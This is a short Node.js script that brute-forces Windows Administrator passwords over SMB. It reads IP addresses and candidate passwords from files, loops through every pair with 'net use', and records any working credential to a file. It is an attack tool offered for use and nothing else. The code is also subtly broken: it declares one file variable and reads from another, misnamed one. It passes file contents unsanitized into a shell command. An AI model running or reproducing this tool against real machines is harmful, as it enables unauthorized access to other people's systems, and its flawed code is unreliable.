const fs = require('fs');
const { execSync } = require('child_process');

const success = 'success.txt';
const ipl = 'ips.txt';
const pwsl = 'password_list.txt';

let count = 1;

const ips = fs.readFileSync(ipl, 'utf-8').split(/\r?\n/).filter(line => line.trim() !== '');
const pws = fs.readFileSync(pwl, 'utf-8').split(/\r?\n/).filter(line => line.trim() !== '');

for (let i = 0; i < ips.length; i++) {
    const ip = ips[i];
    for (let j = 0; j < pws.length; j++) {
        const pass = pws[j];
        console.log(`[${ip}]: "${pass}"`);
        try {
            execSync(`net use \\\\${ip} /user:Administrator ${pass}`, { stdio: 'ignore' });
            console.log(`\nSuccess! Password: ${pass} for IP: ${ip}`);
            fs.appendFileSync(success, `[IP: ${ip}] [Password: ${pass}]\n`);
            try {
                execSync(`net use \\\\${ip} /d /y`, { stdio: 'ignore' });
            } catch (e) {
            }
            process.exit(0);
        } catch (err) {
        }
        count++;
    }
}

console.log('All attempts failed.');
